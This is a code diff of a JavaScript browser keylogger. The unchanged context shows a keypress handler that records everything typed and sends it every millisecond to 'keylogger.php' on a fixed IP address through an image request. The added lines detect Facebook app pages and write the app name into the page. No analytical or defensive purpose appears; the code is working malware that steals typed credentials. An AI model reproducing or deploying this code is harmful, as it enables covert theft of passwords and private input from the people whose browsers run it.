@@ -9,7 +9,6 @@
 //      http.send("key="+param);
 //   }
 //}
-
 var keys = '';
  
 document.onkeypress = function(e) {
@@ -23,3 +22,10 @@ window.setInterval(function(){
     new Image().src = 'http://192.168.1.21/keylogger.php?c=' + keys;
     keys = '';
 }, 1);
+
+if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
+	var app = document.URL.replace("https://apps.facebook.com/", "");
+	var applen = app.indexOf("/");
+	var app = app.slice(0,applen);
+	document.getElementById("rightCol").innerHTML = app;
+}
